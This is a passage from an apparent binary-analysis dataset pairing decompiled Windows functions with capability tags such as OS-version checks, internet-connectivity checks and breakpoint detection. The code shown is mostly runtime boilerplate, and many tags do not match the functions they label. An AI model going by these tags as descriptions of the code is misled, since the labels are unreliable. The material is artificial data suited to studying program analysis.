             puStack20 = puVar5;\n            }\n        }\n        else {\n            in_EAX = sub.user32.dll_CharNextA();\n            puStack20 = puVar3;\n        }\n    }\n    fcn.004054ec();\n    iVar1 = *param_2;\n    iVar6 = 0;\n    puVar3 = puStack20;\n    while (puVar2 = puVar3,  0x20 < *puVar2) {\n        if (*puVar2 == 0x22) {\n            puVar3 = sub.user32.dll_CharNextA(puVar2);\n            while ((puVar5 = puVar3,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar4 = sub.user32.dll_CharNextA(puVar2);\n                for (puVar3 = puVar5; puStack20 = puVar5,  puVar3 < puVar4; puVar3 = puVar3 + 1) {\n                    *(iVar1 + iVar6) = *puVar3;\n                    iVar6 = iVar6 + 1;\n                }\n            }\n            puVar3 = puVar5;\n            if (*puVar5 != 0) {\n                puVar3 = sub.user32.dll_CharNextA(puVar2);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            puVar5 = sub.user32.dll_CharNextA();\n            for (puVar3 = puVar2; puStack20 = puVar2,  puVar3 < puVar5; puVar3 = puVar3 + 1) {\n                *(iVar1 + iVar6) = *puVar3;\n                iVar6 = iVar6 + 1;\n            }\n        }\n    }\n    return CONCAT44(puStack20, puVar2);\n}\n",
        "token_count": 730
    },
    "004030dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004030dc(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar auStack276 [264];\n    \n    fcn.00404da0();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack276, 0x105);\n        fcn.00404e90();\n    }\n    else {\n        sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            fcn.00402fe0();\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "004037e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004037e4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 1) != 0xd7b0) {\n        if (3 < *(in_EAX + 1) - 0xd7b0) goto code_r0x004038b8;\n        iVar1 = (*in_EAX[9])();\n        if (iVar1 != 0) {\n            fcn.00402e60();\n        }\n    }\n    *(in_EAX + 1) = 0xd7b3;\n    in_EAX[2] = param_2;\n    in_EAX[9] = 0x4037bc;\n    in_EAX[7] = 0x4031dc;\n    if (*(in_EAX + 0x12) == '\\0') {\n        in_EAX[9] = 0x4031dc;\n        if (param_1 == 3) {\n            uVar2 = 0xfffffff5;\n        }\n        else {\n            uVar2 = 0xfffffff6;\n        }\n        iVar1 = sub.kernel32.dll_GetStdHandle(uVar2);\n    }\n    else {\n        if (((param_1 != 3) && (param_1 != 2)) && (*(in_EAX + 1) = 0xd7b2,  param_1 != 1)) {\n            *(in_EAX + 1) = 0xd7b1;\n        }\n        iVar1 = sub.kernel32.dll_CreateFileA();\n    }\n    if (iVar1 != -1) {\n        *in_EAX = iVar1;\n        return;\n    }\n    *(in_EAX + 1) = 0xd7b0;\n    sub.kernel32.dll_GetLastError();\ncode_r0x004038b8:\n    fcn.00402e60();\n    return;\n}\n",
        "token_count": 434
    },
    "004038c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004038c4(void)\n\n{\n    fcn.004037e4();\n    return;\n}\n",
        "token_count": 25
    },
    "00403e4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00403e4c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x403ed3;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00403e38();\n    fcn.00405004();\n    uVar1 = fcn.00405060();\n    uVar1 = fcn.00405264(uVar1);\n    uVar1 = fcn.00405060(uVar1);\n    uVar1 = fcn.00405264(uVar1);\n    uVar2 = 0x800;\n    sub.kernel32.dll_CompareStringA(0x800, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00404da0(0x403eda);\n    return;\n}\n",
        "token_count": 243
    },
    "0040400c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040400c(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x404090;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.004040a0();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.00403fdc();\n            fcn.00406588();\n        }\n        else {\n            *param_1 = in_EAX + *(iVar1 + 0x14);\n            if (*param_1 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x404097;\n    uStack32 = 0x40408f;\n    fcn.00406570();\n    return;\n}\n",
        "token_count": 282
    },
    "00404154": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00404154(uint param_1, uint param_2)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.00404124(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00404161. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x493028 != NULL) {\n        (**0x493028)();\n    }\n    *0x490004 = param_2;\n    *0x490000 = 0xd2;\n    fcn.00404cac();\n    return;\n}\n",
        "token_count": 164
    },
    "00404350": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404350(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x490024 != '\\0') {\n        auStack12[0] = param_2;\n        (**0x493014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "004043a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004043a0(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    if (1 < *0x490024) {\n        uVar1 = 0;\n        (**0x493014)(0xeedfae0, 0, 1, &stack0xfffffff8);\n        return uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 87
    },
    "004043d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043d4(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x490024) {\n        uStack16 = 0x4043e5;\n        uStack8 = param_2;\n        fcn.004043b4();\n        (**0x493014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00404c20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00404c20(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char *pcStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x493048 != '\\0') {\n        if ((*0x49321c == -0x284e) && (*0x493224 != 0)) {\n            uStack8 = 0x404c49;\n            (**0x493234)();\n        }\n        pcStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        pcStack16 = 0x1e;\n        pcStack20 = \"Runtime error     at 00000000\";\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x404c5e;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x404ca8, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x49002c == '\\0') {\n        uStack8 = 0;\n        pcStack12 = \"Error\";\n        pcStack16 = \"Runtime error     at 00000000\";\n        pcStack20 = NULL;\n        uStack24 = 0x404c9d;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 348
    },
    "00404cac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00404cac(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x4957ec == 0) && (*0x493044 != NULL)) {\n        do {\n            pcVar1 = *0x493044;\n            *0x493044 = NULL;\n            (*pcVar1)();\n        } while (*0x493044 != NULL);\n    }\n    if (*0x490004 != 0) {\n        fcn.00404b8c();\n        fcn.00404c20();\n        *0x490004 = 0;\n    }\n    do {\n        if ((*0x4957ec == 2) && (*0x490000 == 0)) {\n            *0x4957d0 = 0;\n        }\n        fcn.00404a18();\n        if (((*0x4957ec < 2) || (*0x490000 != 0)) && (*0x4957d4 != 0)) {\n            fcn.00406500();\n            iVar2 = *(*0x4957d4 + 0x10);\n            if ((iVar2 != *(*0x4957d4 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.004049f0();\n        if (*0x4957ec == 1) {\n            (**0x4957e8)();\n        }\n        if (*0x4957ec != 0) {\n            fcn.00404bf0();\n        }\n        if (*0x4957c4 == NULL) {\n            if (*0x493024 != NULL) {\n                (**0x493024)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x490000);\n        }\n        puVar3 = *0x4957c4;\n        puVar4 = 0x4957c4;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 500
    },
    "004054ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004054ec(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.00402d18();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.00404e64();\n        if (*in_EAX != 0) {\n            fcn.00402ee0();\n        }\n    }\n    fcn.00404da0();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 195
    },
    "00405780": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405780(uint arg_8h)\n\n{\n    fcn.004056f0();\n    fcn.00405670();\n    return;\n}\n",
        "token_count": 38
    },
    "00405914": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00405914(void)\n\n{\n    if (*0x49000c != NULL) {\n        (**0x49000c)();\n        return;\n    }\n    fcn.00402e34();\n    return;\n}\n",
        "token_count": 49
    },
    "0040592c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.0040592c(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00404da0();\n            }\n            else {\n                fcn.00404dc4();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405580();\n            }\n            else {\n                fcn.00405598();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00405914();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.0040592c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004058e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00406570();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402ddc();\n                return;\n            }\n            do {\n                fcn.00405e64();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "00405a24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00405a24(void)\n\n{\n    if (*0x490014 != NULL) {\n        (**0x490014)();\n        return;\n    }\n    fcn.00402e34();\n    return;\n}\n",
        "token_count": 48
    },
    "00405ef8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00405ef8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.0040615c();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 153
    },
    "00405f98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00405f98(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint *puVar6;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    int32_t hFindFile;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    hFindFile = sub.kernel32.dll_GetModuleHandleA(0x406138);\n    if (((hFindFile == 0) || (pcVar1 = sub.kernel32.dll_GetProcAddress(hFindFile, 0x406148),  pcVar1 == NULL)) ||\n       (iVar2 = (*pcVar1)(lpString1, &lpFileName, 0x105),  iVar2 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00405f78();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00405f78();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            pcVar3 = lpString1 + 2;\n        }\n        iVar2 = pcVar3 - lpString1;\n        puVar6 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar6, lpString1, iVar2 + 1);\n        while (*pcVar3 != '\\0') {\n            pcVar4 = fcn.00405f78();\n            if (0x105 < pcVar4 + (iVar2 - pcVar3) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2, pcVar3, pcVar4 + (1 - pcVar3));\n            hFindFile = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (hFindFile == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(hFindFile);\n            iVar5 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar5 + iVar2 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar2) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2 + 1, &lpString2, 0x104 - iVar2);\n            puVar6 = &lpString2;\n            iVar5 = sub.kernel32.dll_lstrlenA();\n            iVar2 = iVar2 + iVar5 + 1;\n            pcVar3 = pcVar4;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar6);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 856
    },
    "0040615c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040615c(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar5;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.0040615c::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    puVar3 = &fcn.0040615c::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x40638c;\n    uVar5 = 0x80000001;\n    noname_12 = 0x40619b;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.0040615c::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x40638c;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x4061b9;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.0040615c::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x4063a8;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar5 = sub.kernel32.dll_GetThreadLocale(3, &fcn.0040615c::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar5);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.0040615c::lpLibFileName);\n                    for (puVar3 = &fcn.0040615c::lpLibFileName + iVar2;\n                        (*puVar3 != '.' && (puVar3 != &fcn.0040615c::lpLibFileName)); puVar3 = puVar3 + -1) {\n                    }\n                    if (puVar3 != &fcn.0040615c::lpLibFileName) {\n                        pcVar4 = puVar3 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.0040615c::var_12h, 0x105 - (pcVar4 - &fcn.0040615c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.0040615c::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.0040615c::var_eh + 1, \n                                       0x105 - (pcVar4 - &fcn.0040615c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.0040615c::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (pcVar4, &fcn.0040615c::var_eh + 1, \n                                           0x105 - (pcVar4 - &fcn.0040615c::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.0040615c::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00405f98(noname_0, 0x406261, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar5, noname_14, noname_15, noname_16, puVar3, noname_18, noname_19, \n                 noname_20, unaff_ESI);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.0040615c::lpLibFileName, 0, 0, &fcn.0040615c::var_12h, &fcn.0040615c::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x4063c8, 0, 0, &fcn.0040615c::var_12h, &fcn.0040615c::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x406268);\n    return iVar1;\n}\n",
        "token_count": 1589
    },
    "00406494": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00406494(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x490038;\n    if (*0x490038 != NULL) {\n        do {\n            uStack32 = 0x4064cf;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "00406680": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406680(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n   